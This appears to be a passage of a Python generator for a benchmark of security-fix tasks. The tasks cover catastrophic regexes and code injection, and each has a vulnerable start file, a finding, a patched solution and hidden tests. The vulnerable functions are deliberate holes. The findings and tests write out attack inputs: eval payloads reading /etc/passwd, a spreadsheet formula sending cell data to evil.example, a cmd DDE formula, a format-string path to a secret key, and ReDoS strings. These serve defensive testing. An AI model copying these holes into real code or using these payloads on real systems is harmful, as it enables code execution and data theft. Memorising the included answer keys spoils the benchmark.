    ''')},
))

HOST = dd(r'''
    """Host name check for the webhook settings."""
    import re

    HOSTNAME = re.compile(r"^(([a-z0-9]+-?)+\.)+[a-z]{2,}$")


    def is_hostname(text):
        """True for DNS host names of at least two labels: labels of letters, digits and hyphens that neither start nor end with a hyphen (`xn--` style labels with two hyphens in a row are fine),
        dot-separated, ending in a top-level label of 2 or more letters; case-insensitive; at most 253 characters in total and 63 per label. Must be fast for any input."""
        return len(text) <= 253 and bool(HOSTNAME.match(text.lower()))
''')

RX.append(dict(
    slug="hostname-regex", d=3, product="the webhook settings", func="is_hostname", cwe="CWE-1333",
    finding="`HOSTNAME` is `^(([a-z0-9]+-?)+\\.)+[a-z]{2,}$`: a label of 30 characters followed by something invalid makes the engine try every way to split the label into `[a-z0-9]+-?` pieces (exponential time), and the pattern also accepts labels ending in a hyphen (`a-.example.com`) and rejects the `xn--` labels of internationalised names.",
    start={"hosts.py": HOST, "README.md": readme("host names", "`is_hostname(text)` follows its docstring: `example.com`, `a-b.example.co.uk`, `EXAMPLE.COM`, `xn--bcher-kva.example` are valid; `example`, `-a.com`, `a-.com`, `exa mple.com`, `example.c`, `1.2.3.4`, `a..com` and names longer than 253 characters or with a label longer than 63 are not. Linear time for any input.")},
    solution={"hosts.py": patched(HOST, ('HOSTNAME = re.compile(r"^(([a-z0-9]+-?)+\\.)+[a-z]{2,}$")', 'LABEL = r"[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?"\nHOSTNAME = re.compile(r"(?:" + LABEL + r"\\.)+[a-z]{2,}")'), (
        'return len(text) <= 253 and bool(HOSTNAME.match(text.lower()))', 'return len(text) <= 253 and HOSTNAME.fullmatch(text.lower()) is not None'))},
    hidden={"tests/test_hosts_security.py": RXT + dd(r'''
        import hosts as m


        class HostTest(unittest.TestCase):
            def test_table(self):
                for text in ["example.com", "a-b.example.co.uk", "EXAMPLE.COM", "xn--bcher-kva.example", "x.y.z.com", "a" * 63 + ".com", "9lives.example.org", ".".join(["a" * 50] * 4) + ".com"]:
                    self.assertTrue(m.is_hostname(text), text[:30])
                for text in ["example", "-a.com", "a-.com", "exa mple.com", "example.c", "1.2.3.4", "a..com", "a" * 64 + ".com", ".".join(["a" * 60] * 5) + ".com", "", ".com", "a.com.", "a_b.com", "a.c0m", "http://a.com", "a.com/x"]:
                    self.assertFalse(m.is_hostname(text), text[:30])

            def test_adversarial_inputs_finish(self):
                for payload in ['"a" * 30 + "!"', '"a-" * 15 + "!"', '"a" * 250 + "!"', '"a." * 120 + "!"', '"a" * 60 + "." + "a" * 60 + "." + "1"']:
                    self.assertTrue(finishes("assert m.is_hostname(%s) is False" % payload, "hosts"), payload)


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

AMOUNT = dd(r'''
    """Amount parsing for the CSV importer."""
    import re

    AMOUNT = re.compile(r"^(\d{1,3}(,\d{3})*|\d+)+(\.\d{2})?$")


    def is_amount(text):
        """True for money amounts: digits only (`1234`) or digits grouped by commas in threes (`1,234,567`), optionally followed by a decimal point and exactly two digits (`0.99`, `1,234.50`).
        A comma group must have exactly three digits and the first group one to three: `1234,567`, `1,23` and `,123` are invalid. Must be fast for any input."""
        return bool(AMOUNT.match(text))
''')

RX.append(dict(
    slug="amount-regex", d=3, product="the CSV importer", func="is_amount", cwe="CWE-1333",
    finding="`AMOUNT` wraps an alternation that can match the same digits in two ways inside a `+` (`(\\d{1,3}(,\\d{3})*|\\d+)+`): a line of 30 digits followed by a letter takes exponential time to reject, and an attacker only has to upload a CSV with one such cell. The pattern also accepts `1234,567`, which is not a valid amount.",
    start={"amounts.py": AMOUNT, "README.md": readme("amounts", "`is_amount(text)` accepts exactly what its docstring describes: `0`, `1234`, `1,234`, `1,234,567.89`, `12.50`, `999,999` are valid; `1234,567`, `1,23`, `,123`, `12.5`, `12.`, `1,234.567`, `` (empty), `1 234` and `12a` are not. Linear time for any input.")},
    solution={"amounts.py": patched(AMOUNT, ('AMOUNT = re.compile(r"^(\\d{1,3}(,\\d{3})*|\\d+)+(\\.\\d{2})?$")', 'AMOUNT = re.compile(r"(?:\\d{1,3}(?:,\\d{3})+|\\d+)(?:\\.\\d{2})?")'), ('return bool(AMOUNT.match(text))', 'return AMOUNT.fullmatch(text) is not None'))},
    hidden={"tests/test_amounts_security.py": RXT + dd(r'''
        import amounts as m


        class AmountTest(unittest.TestCase):
            def test_table(self):
                for text in ["0", "1234", "1,234", "1,234,567.89", "12.50", "999,999", "0.99", "12345678901234567890", "123,456,789,012"]:
                    self.assertTrue(m.is_amount(text), text)
                for text in ["1234,567", "1,23", ",123", "12.5", "12.", "1,234.567", "", "1 234", "12a", "1,2345", "1,234,56", ".99", "-5", "1,234,", "1..00", "1.2.3"]:
                    self.assertFalse(m.is_amount(text), text)

            def test_adversarial_inputs_finish(self):
                for payload in ['"1" * 30 + "x"', '"123," * 20 + "x"', '"1" * 100000 + "x"', '"1," + "234," * 20000 + "x"']:
                    self.assertTrue(finishes("assert m.is_amount(%s) is False" % payload, "amounts"), payload)


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

TAGS = dd(r'''
    """HTML clean-up for the search index."""
    import re


    def strip_tags(html):
        """The text of `html` without its tags. A tag starts with `<` followed by a letter, `/` or `!`, continues with any characters except `<` and `>` (line breaks included) and ends with `>`.
        Everything else stays, including a lone `<` and the `<` of comparisons such as `1 < 2` (and, for `<<a>`, the first `<`). Must be fast for any input."""
        return re.sub(r"<(.|\n)*?>", "", html)
''')

RX.append(dict(
    slug="strip-tags", d=3, product="the search indexer", func="strip_tags", cwe="CWE-1333",
    finding="`strip_tags` uses `<(.|\\n)*?>`: for input with many `<` and no `>` (a text full of `<` characters) every `<` scans to the end of the document, with a slow alternation per character, and the indexer needs minutes for a 20 KB page. The pattern also treats `1 < 2 and 3 > 2` as a tag and deletes text.",
    start={"indexer.py": TAGS, "README.md": readme("search indexer", "`strip_tags(html)` follows its docstring exactly: `<p>Hello <b>world</b></p>` gives `Hello world`; `1 < 2 and 3 > 2` and `a<b` stay as they are; `<<script>x</script>` gives `<x`; `<!-- c -->text` gives `text`; tags with line breaks inside (`<a\\nhref='x'>t</a>`) are removed. Linear time for any input.")},
    solution={"indexer.py": patched(TAGS, ('"""HTML clean-up for the search index."""\nimport re\n', '"""HTML clean-up for the search index."""\nimport re\n\nTAG = re.compile(r"<[A-Za-z/!][^<>]*>")\n'), ('    return re.sub(r"<(.|\\n)*?>", "", html)\n', '    return TAG.sub("", html)\n'))},
    hidden={"tests/test_indexer_security.py": RXT + dd(r'''
        import indexer as m


        class StripTagsTest(unittest.TestCase):
            def test_table(self):
                for html, want in [("<p>Hello <b>world</b></p>", "Hello world"), ("1 < 2 and 3 > 2", "1 < 2 and 3 > 2"), ("a<b", "a<b"), ("<<script>x</script>", "<x"), ("<!-- c -->text", "text"),
                                   ("<a\nhref='x'>t</a>", "t"), ("", ""), ("no tags", "no tags"), ("<br/>x<br />", "x"), ("5 <3 you", "5 <3 you"), ("<div class=\"a\">b</div><div>c</div>", "bc"), ("x <", "x <")]:
                    self.assertEqual(m.strip_tags(html), want, html)

            def test_adversarial_inputs_finish(self):
                for payload in ['"<" * 30000', '"<a" * 20000', '"<a " * 15000 + "x"', '"<" * 20000 + ">"']:
                    self.assertTrue(finishes("m.strip_tags(%s)" % payload, "indexer"), payload)


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

RX_ORDER = ["display-name", "trailing-whitespace", "email-regex", "hostname-regex", "amount-regex", "strip-tags"]
RX.sort(key=lambda s: (s["d"], RX_ORDER.index(s["slug"])))


@family("security-redos", category="security", lang="python", kind="fix", n=6,
        summary="catastrophic regular expressions: nested quantifiers, overlapping alternations, quadratic scans; hard time budget in tests")
def gen_redos(rng, n):
    return list(_sec.emit(rng, RX[:n], tags=["redos"]))


# =================================================================================================================================
#  code injection
# =================================================================================================================================
CI = []

CALC = dd(r'''
    """Calculator widget of the dashboard."""


    def calculate(expression):
        """The value of an arithmetic expression typed by a user: integer and float literals, the binary operators `+ - * / // % **`, unary `+` and `-`, and parentheses.
        Everything else (names, calls, attributes, strings, comparisons, lists, lambdas...) is a ValueError, and so are division by zero, an exponent above 100 in absolute value and an
        expression longer than 200 characters."""
        return eval(expression)
''')

CI.append(dict(
    slug="calculator-eval", d=3, product="the dashboard calculator", func="calculate", cwe="CWE-95",
    finding="`calculate` passes what the user typed to `eval`: `__import__('os').system(...)`, `open('/etc/passwd').read()` or any other Python expression runs on the server with the application's privileges, and `9**9**9` hangs it.",
    start={"calc.py": CALC, "README.md": readme("calculator", "`calculate(expression)` evaluates only what its docstring allows, with Python's operator semantics (`7//2` is 3, `-3 % 5` is 2, `2**-1` is 0.5, `1/2` is 0.5, `2**100` is exact) and raises `ValueError` for everything else; parse the expression as an AST and walk it - never `eval`, `exec` or `compile`.")},
    solution={"calc.py": dd(r'''
        """Calculator widget of the dashboard."""
        import ast
        import operator

        BINARY = {ast.Add: operator.add, ast.Sub: operator.sub, ast.Mult: operator.mul, ast.Div: operator.truediv, ast.FloorDiv: operator.floordiv, ast.Mod: operator.mod, ast.Pow: operator.pow}
        UNARY = {ast.UAdd: operator.pos, ast.USub: operator.neg}


        def _walk(node):
            if isinstance(node, ast.Expression):
                return _walk(node.body)
            if isinstance(node, ast.Constant) and type(node.value) in (int, float):
                return node.value
            if isinstance(node, ast.UnaryOp) and type(node.op) in UNARY:
                return UNARY[type(node.op)](_walk(node.operand))
            if isinstance(node, ast.BinOp) and type(node.op) in BINARY:
                left, right = _walk(node.left), _walk(node.right)
                if isinstance(node.op, ast.Pow) and abs(right) > 100:
                    raise ValueError("exponent too large")
                try:
                    return BINARY[type(node.op)](left, right)
                except ZeroDivisionError:
                    raise ValueError("division by zero")
                except OverflowError:
                    raise ValueError("result too large")
            raise ValueError("unsupported expression")


        def calculate(expression):
            """The value of an arithmetic expression typed by a user: integer and float literals, the binary operators `+ - * / // % **`, unary `+` and `-`, and parentheses.
            Everything else (names, calls, attributes, strings, comparisons, lists, lambdas...) is a ValueError, and so are division by zero, an exponent above 100 in absolute value and an
            expression longer than 200 characters."""
            if not isinstance(expression, str) or len(expression) > 200:
                raise ValueError("bad expression")
            try:
                tree = ast.parse(expression.strip(), mode="eval")
            except (SyntaxError, MemoryError, RecursionError):
                raise ValueError("not an expression")
            try:
                return _walk(tree)
            except RecursionError:
                raise ValueError("too deeply nested")
    ''')},
    hidden={"tests/test_calc_security.py": MARK + dd(r'''
        import calc as m


        class CalcTest(unittest.TestCase):
            def setUp(self):
                del CALLS[:]
                m.mark = mark            # a vulnerable eval() would find it in the module namespace

            def test_arithmetic(self):
                for expr, want in [("1+2*3", 7), ("(1+2)*3", 9), ("7//2", 3), ("-3 % 5", 2), ("2**-1", 0.5), ("1/2", 0.5), ("2**100", 2 ** 100), (" 4 ", 4), ("-(-3)", 3), ("+5", 5), ("1_000 * 2", 2000),
                                   ("2 ** 3 ** 2", 512), ("10 - 2 - 3", 5), ("1.5 * 4", 6.0), ("((((2))))", 2), ("5 % 3 * 2", 4), ("2*-3", -6), ("0.1 + 0.2", 0.1 + 0.2)]:
                    self.assertEqual(m.calculate(expr), want, expr)

            def test_everything_else_is_refused(self):
                for expr in ["mark('pwned')", "__import__('os').getcwd()", "open('x')", "(lambda: 1)()", "'a' * 3", "[1, 2]", "1 if True else 2", "1 < 2", "abs(-1)", "x", "1; 2", "import os",
                             "().__class__", "True + 1", "1 and 2", "not 1", "1j", "(1, 2)", "{1: 2}", "[mark('x') for _ in [0]]", "mark", "2**101", "2**-101", "2**100000", "1/0", "1//0", "1 % 0", "", "   ", "(", "1 +",
                             "1" + "+1" * 200, "(" * 100 + "1" + ")" * 100 + " " * 100, "e", "0x10 if 1 else 2", "1 @ 2", "~1", "1 << 2", "1 | 2", "f'{mark()}'", "b'x'", "...", "None", "1 == 1"]:
                    self.assertIsNone(attempt(m.calculate, expr), expr)
                    self.assertRaises(ValueError, m.calculate, expr)
                self.assertEqual(CALLS, [])
                self.assertRaises(ValueError, m.calculate, None)
                self.assertRaises(ValueError, m.calculate, 5)


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

CONSOLE = dd(r'''
    """Operator console of the job scheduler."""


    class Console:
        COMMANDS = ("status", "restart", "help")

        def __init__(self):
            self.log = []
            self.wiped = False

        def status(self):
            return "ok"

        def restart(self, service):
            self.log.append("restart " + service)
            return "restarted " + service

        def help(self):
            return "commands: " + ", ".join(self.COMMANDS)

        def _wipe(self):
            """Maintenance only: deletes the queue."""
            self.wiped = True
            return "wiped"

        def run(self, line):
            """Execute one console line: a command name followed by its arguments, separated by spaces. Only the commands listed in COMMANDS can be run; any other name - private helpers, special methods,
            attributes, unknown words - is a ValueError("unknown command"). A wrong number of arguments is a ValueError as well."""
            name, *args = line.split()
            return getattr(self, name)(*args)
''')

CI.append(dict(
    slug="getattr-dispatch", d=2, product="the scheduler operator console", func="Console.run", cwe="CWE-470",
    finding="`run` looks the command word up with `getattr(self, name)` and calls the result, so a console line like `_wipe` (a private maintenance helper), `__init__` or `run` reaches methods that were never meant to be commands; the dispatch table is the whole object.",
    start={"console.py": CONSOLE, "README.md": readme("operator console", "`run(line)` dispatches exactly `status`, `restart <service>` and `help` (the names in `COMMANDS`); every other first word raises `ValueError(\"unknown command\")` without touching anything. A wrong number of arguments for a listed command raises `ValueError`. Empty lines are `ValueError` too.")},
    solution={"console.py": patched(CONSOLE, (
        '''            name, *args = line.split()
            return getattr(self, name)(*args)
''', '''            words = line.split()
            if not words or words[0] not in self.COMMANDS:
                raise ValueError("unknown command")
            name, args = words[0], words[1:]
            try:
                return getattr(self, name)(*args)
            except TypeError:
                raise ValueError("wrong number of arguments")
'''))},
    hidden={"tests/test_console_security.py": P + dd(r'''
        import console as m


        class ConsoleTest(unittest.TestCase):
            def test_commands(self):
                c = m.Console()
                self.assertEqual(c.run("status"), "ok")
                self.assertEqual(c.run("restart  web"), "restarted web")
                self.assertEqual(c.run("help"), "commands: status, restart, help")
                self.assertEqual(c.log, ["restart web"])
                for line in ["restart", "restart a b", "status now", "help me"]:
                    self.assertIsNone(attempt(c.run, line), line)
                self.assertRaises(ValueError, c.run, "restart")

            def test_nothing_else_is_reachable(self):
                for line in ["_wipe", "__init__", "__class__", "run status", "COMMANDS", "wiped", "log", "_wipe now", "STATUS", "Status", "__dict__", "__del__", "", "   ", "restart_all", "statu", "status\u200b"]:
                    c = m.Console()
                    self.assertIsNone(attempt(c.run, line), line)
                    self.assertFalse(c.wiped, line)
                    self.assertEqual(c.log, [], line)
                    self.assertRaises(ValueError, c.run, line)


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

FORMULA = dd(r'''
    """Spreadsheet export of the orders report."""
    import csv
    import io


    def export_csv(rows):
        """CSV text (csv module defaults, `\r\n` line ends) for `rows`, a list of lists whose cells are strings, numbers (int, float), booleans or None (written as an empty cell).

        The file is opened in spreadsheet programs, which run cells that start with `=`, `+`, `-` or `@` (and with a tab or carriage return) as formulas: such *string* cells are written with a single
        quote in front (`'=1+1`), so they are shown as text. Numbers are never changed: an int or float -5 is written `-5`."""
        out = io.StringIO()
        csv.writer(out).writerows(rows)
        return out.getvalue()
''')

CI.append(dict(
    slug="csv-formula", d=2, product="the orders report export", func="export_csv", cwe="CWE-1236",
    finding="`export_csv` writes customer-supplied text (names, notes) straight into the CSV: a customer whose name is `=HYPERLINK(\"http://evil.example/?\"&A2,\"click\")` or `=cmd|' /C calc'!A0` gets a formula executed on the accountant's machine when the report is opened in a spreadsheet (CSV / formula injection).",
    start={"report.py": FORMULA, "README.md": readme("orders report", "`export_csv(rows)` writes strings that begin with `=`, `+`, `-`, `@`, a tab or a carriage return with a leading single quote, and nothing else changes: other strings, numbers (including negative ones), booleans and `None` are written as before, quoting and escaping are the csv module's.")},
    solution={"report.py": patched(FORMULA, (
        '        csv.writer(out).writerows(rows)\n', '''        def safe(cell):
            if isinstance(cell, str) and cell[:1] in ("=", "+", "-", "@", "\\t", "\\r"):
                return "'" + cell
            return cell

        csv.writer(out).writerows([[safe(c) for c in row] for row in rows])
'''))},
    hidden={"tests/test_report_security.py": P + dd(r'''
        import csv
        import io

        import report as m


        def parse(text):
            return list(csv.reader(io.StringIO(text, newline="")))


        class ReportTest(unittest.TestCase):
            def test_normal_cells(self):
                rows = [["name", "qty", "price", "ok", "note"], ["Ann, \"A\"", 3, -5.5, True, None], ["multi\nline", -7, 0, False, "a=b"], ["x-y", "", "1+1", "mid @ text", "50% off"]]
                text = m.export_csv(rows)
                self.assertTrue(text.endswith("\r\n"))
                self.assertEqual(parse(text), [["name", "qty", "price", "ok", "note"], ['Ann, "A"', "3", "-5.5", "True", ""], ["multi\nline", "-7", "0", "False", "a=b"], ["x-y", "", "1+1", "mid @ text", "50% off"]])
                self.assertIn("-5.5", text)
                self.assertEqual(m.export_csv([]), "")

            def test_formulas_are_neutralised(self):
                cells = ['=1+1', '=HYPERLINK("http://evil.example/?"&A2,"click")', "+1+1", "-2+3", "@SUM(A1:A2)", "\t=1+1", "\r=1+1", "=cmd|' /C calc'!A0", "-", "="]
                got = parse(m.export_csv([[c] for c in cells]))
                for cell, row in zip(cells, got):
                    self.assertEqual(row, ["'" + cell], cell)
                self.assertEqual(parse(m.export_csv([["-5", -5, 5.0]])), [["'-5", "-5", "5.0"]])
                self.assertEqual(parse(m.export_csv([["safe=1", "a-b", " =1"]])), [["safe=1", "a-b", " =1"]])


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

FMT = dd(r'''
    """E-mail templates edited by customers in the admin panel."""

    SECRET_KEY = "sk-live-9d41c0a77e2b45f3"


    class User:
        def __init__(self, name, email):
            self.name = name
            self.email = email


    def render_email(template, name, email):
        """Fill the placeholders `{name}` and `{email}` of a customer-edited template. `{{` and `}}` stand for literal braces. Every other placeholder - unknown names, positional `{}` or `{0}`,
        attribute or index access such as `{name.upper}` or `{email[0]}`, conversions `{name!r}` and format specs `{name:>10}` - is a ValueError."""
        return template.format(user=User(name, email), name=name, email=email)
''')

CI.append(dict(
    slug="format-template", d=3, product="the e-mail templates", func="render_email", cwe="CWE-134",
    finding="`render_email` hands customer-written templates to `str.format` together with a `User` object: a template containing `{user.__class__.__init__.__globals__[SECRET_KEY]}` (attribute and index traversal) prints the application's signing key into the e-mail, and `{name.__class__}` style fields expose internals.",
    start={"mailtemplate.py": FMT, "README.md": readme("e-mail templates", "`render_email(template, name, email)` supports `{name}`, `{email}` and the brace escapes `{{`, `}}` and nothing else (see its docstring); anything else raises `ValueError`. The values are inserted verbatim, even if they contain braces themselves.")},
    solution={"mailtemplate.py": patched(FMT, ('"""E-mail templates edited by customers in the admin panel."""\n', '"""E-mail templates edited by customers in the admin panel."""\nimport string\n'), (
        '        return template.format(user=User(name, email), name=name, email=email)\n', '''        values = {"name": name, "email": email}
        out = []
        for literal, field, spec, conversion in string.Formatter().parse(template):
            out.append(literal)
            if field is None:
                continue
            if field not in values or spec or conversion:
                raise ValueError("unsupported placeholder {%s}" % field)
            out.append(values[field])
        return "".join(out)
'''))},
    hidden={"tests/test_mailtemplate_security.py": P + dd(r'''
        import mailtemplate as m


        class TemplateTest(unittest.TestCase):
            def test_templates(self):
                self.assertEqual(m.render_email("Hi {name} <{email}>!", "Ann", "ann@example.com"), "Hi Ann <ann@example.com>!")
                self.assertEqual(m.render_email("{{name}} is {name}; {{{email}}}", "Ann", "a@x"), "{name} is Ann; {a@x}")
                self.assertEqual(m.render_email("no placeholders", "Ann", "a@x"), "no placeholders")
                self.assertEqual(m.render_email("{name}{name}", "A", "a@x"), "AA")
                self.assertEqual(m.render_email("Hi {name}", "{email} {0} {user}", "a@x"), "Hi {email} {0} {user}")
                self.assertEqual(m.render_email("", "A", "b"), "")

            def test_nothing_else_is_expanded(self):
                for template in ["{user.__class__.__init__.__globals__[SECRET_KEY]}", "{name.__class__}", "{name.upper}", "{email[0]}", "{0}", "{}", "{user}", "{user.name}", "{name!r}", "{name:>10}", "{name!s:5}",
                                 "{missing}", "{ name }", "{name", "name}", "{name.__class__.__mro__}", "{__class__}", "{email.__len__}", "{0[0]}", "{name:{email}}"]:
                    out = attempt(m.render_email, template, "Ann", "ann@example.com")
                    self.assertIsNone(out, template)
                    self.assertRaises(ValueError, m.render_email, template, "Ann", "ann@example.com")
                self.assertNotIn(m.SECRET_KEY, repr(attempt(m.render_email, "{user.__class__.__init__.__globals__[SECRET_KEY]}", "A", "b")))


        if __name__ == "__main__":
            unittest.main()
    ''')},
))

CI_ORDER = ["getattr-dispatch", "csv-formula", "calculator-eval", "format-template"]
CI.sort(key=lambda s: (s["d"], CI_ORDER.index(s["slug"])))


@family("security-code-injection", category="security", lang="python", kind="fix", n=4,
        summary="code injection: eval, getattr dispatch, format-string attribute traversal, spreadsheet formulas")
def gen_code_injection(rng, n):
    return list(_sec.emit(rng, CI[:n], tags=["injection"]))
